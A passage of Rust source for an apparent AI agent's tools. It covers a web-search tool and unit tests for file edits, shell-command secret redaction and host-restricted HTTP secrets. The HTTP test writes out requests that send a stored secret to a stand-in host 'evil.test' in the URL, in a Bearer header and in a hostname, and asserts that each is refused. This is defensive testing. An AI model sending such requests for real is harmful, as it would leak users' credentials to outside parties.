                if let Ok(v) = r.json::<Value>().await {
                    for item in v["results"].as_array().into_iter().flatten().take(max) {
                        lines.push(format!(
                            "- {} — {}\n  {}",
                            item["title"].as_str().unwrap_or(""),
                            item["url"].as_str().unwrap_or(""),
                            item["content"].as_str().unwrap_or("").trim()
                        ));
                    }
                }
            }
            Ok(r) => return Output::err(format!("SearXNG が HTTP {} を返しました", r.status().as_u16())),
            Err(e) => return Output::err(format!("SearXNG に届きません: {e}")),
        }
    } else {
        let r = env
            .client
            .get("https://api.duckduckgo.com/")
            .query(&[("q", q), ("format", "json"), ("no_html", "1"), ("skip_disambig", "1")])
            .timeout(Duration::from_secs(20))
            .send()
            .await;
        match r {
            Ok(r) if r.status().is_success() => {
                if let Ok(v) = r.json::<Value>().await {
                    if let Some(t) = v["AbstractText"].as_str().filter(|t| !t.is_empty()) {
                        lines.push(format!(
                            "- {} — {}\n  {t}",
                            v["Heading"].as_str().unwrap_or(""),
                            v["AbstractURL"].as_str().unwrap_or("")
                        ));
                    }
                    let mut topics: Vec<&Value> = vec![];
                    for t in v["RelatedTopics"].as_array().into_iter().flatten() {
                        if t.get("Topics").is_some() {
                            topics.extend(t["Topics"].as_array().into_iter().flatten());
                        } else {
                            topics.push(t);
                        }
                    }
                    for t in topics.into_iter().take(max.saturating_sub(lines.len())) {
                        lines.push(format!("- {}\n  {}", t["FirstURL"].as_str().unwrap_or(""), t["Text"].as_str().unwrap_or("")));
                    }
                }
            }
            Ok(r) => return Output::err(format!("検索が HTTP {} を返しました", r.status().as_u16())),
            Err(e) => return Output::err(format!("検索に届きません: {e}")),
        }
        if lines.is_empty() {
            lines.push("（即答の結果がありません。設定 search.searxng_url に SearXNG を入れると、ふつうの検索結果が返ります）".into());
        }
    }
    let n = lines.len();
    Output { content: lines.join("\n"), ok: true, summary: format!("{n} 件"), external: true }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn env_for<'a>(
        cwd: &'a Path,
        roots: &'a [PathBuf],
        settings: &'a Settings,
        book: &'a Book,
        client: &'a reqwest::Client,
        cancel: &'a CancellationToken,
    ) -> Env<'a> {
        Env { cwd, roots, settings, book, client, cancel }
    }

    fn args(v: Value) -> Map<String, Value> {
        v.as_object().unwrap().clone()
    }

    #[tokio::test]
    async fn files_round_trip_with_edits() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().canonicalize().unwrap();
        let roots = vec![cwd.clone()];
        let settings = Settings::default();
        let book = Book::default();
        let client = reqwest::Client::new();
        let cancel = CancellationToken::new();
        let env = env_for(&cwd, &roots, &settings, &book, &client, &cancel);

        let w = args(json!({"path": "src/a.txt", "content": "one\ntwo\nthree\n"}));
        let prep = prepare("write_file", &w, &env).unwrap();
        assert_eq!(prep.kind, ToolKind::Write);
        assert!(!prep.outside);
        assert!(run("write_file", &w, &env).await.ok);

        let e = args(json!({"path": "src/a.txt", "old_string": "two", "new_string": "TWO"}));
        assert!(prepare("edit_file", &e, &env).unwrap().detail.contains("TWO"));
        let out = run("edit_file", &e, &env).await;
        assert!(out.ok, "{}", out.content);
        assert_eq!(std::fs::read_to_string(cwd.join("src/a.txt")).unwrap(), "one\nTWO\nthree\n");

        let dup = args(json!({"path": "src/a.txt", "old_string": "e", "new_string": "E"}));
        assert!(prepare("edit_file", &dup, &env).unwrap_err().contains("か所"));

        let r = run("read_file", &args(json!({"path": "src/a.txt", "offset": 2, "limit": 1})), &env).await;
        assert!(r.content.contains("     2│TWO"));
        assert!(r.content.contains("offset=3"));

        let g = run("grep", &args(json!({"pattern": "^TW"})), &env).await;
        assert!(g.content.contains("src/a.txt:2: TWO"), "{}", g.content);
        let gl = run("glob", &args(json!({"pattern": "**/*.txt"})), &env).await;
        assert!(gl.content.contains("src/a.txt"));

        let outside = prepare("write_file", &args(json!({"path": "/tmp/x-arce-test", "content": ""})), &env).unwrap();
        assert!(outside.outside);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn commands_run_and_secrets_are_redacted() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_path_buf();
        let roots = vec![cwd.clone()];
        let settings = Settings::default();
        let mut book = Book::default();
        book.entries
            .insert("tok".into(), BookEntry { value: "supersecretvalue".into(), hosts: vec!["api.example.com".into()], kind: "user" });
        book.all_values.insert("tok".into(), "supersecretvalue".into());
        let client = reqwest::Client::new();
        let cancel = CancellationToken::new();
        let env = env_for(&cwd, &roots, &settings, &book, &client, &cancel);
        let a = args(json!({"command": "echo {{secret:tok}}; echo $ARCE_SECRET_TOK; exit 3", "secrets": ["tok"]}));
        let prep = prepare("run_command", &a, &env).unwrap();
        assert!(prep.secret);
        let out = run("run_command", &a, &env).await;
        assert!(!out.ok);
        assert!(out.content.contains("exit code: 3"));
        assert!(!out.content.contains("supersecretvalue"), "{}", out.content);
        assert_eq!(out.content.matches("[secret:tok]").count(), 2);

        let bad = args(json!({"command": "echo {{secret:nope}}"}));
        assert!(prepare("run_command", &bad, &env).unwrap_err().contains("使える名前: tok"));
    }

    #[test]
    fn http_secrets_only_go_to_their_hosts() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_path_buf();
        let roots = vec![cwd.clone()];
        let settings = Settings::default();
        let mut book = Book::default();
        book.entries.insert("k".into(), BookEntry { value: "v".repeat(10), hosts: vec!["api.example.com".into()], kind: "user" });
        let client = reqwest::Client::new();
        let cancel = CancellationToken::new();
        let env = env_for(&cwd, &roots, &settings, &book, &client, &cancel);
        let ok = args(json!({"url": "https://api.example.com/v1?key={{secret:k}}"}));
        assert!(prepare("http_request", &ok, &env).unwrap().secret);
        let elsewhere = args(json!({"url": "https://evil.test/?k={{secret:k}}"}));
        assert!(prepare("http_request", &elsewhere, &env).is_err());
        let in_host = args(json!({"url": "https://{{secret:k}}.example.com/"}));
        assert!(prepare("http_request", &in_host, &env).unwrap_err().contains("ホスト"));
        let header = args(json!({"url": "https://evil.test/", "headers": {"Authorization": "Bearer {{secret:k}}"}}));
        assert!(prepare("http_request", &header, &env).is_err());
    }

    #[test]
    fn clip_keeps_both_ends() {
        let t = format!("{}{}", "a".repeat(100), "b".repeat(100));
        let c = clip_middle(&t, 30);
        assert!(c.starts_with("aaaa") && c.ends_with("bbbb") && c.contains("170 characters"));
    }
}
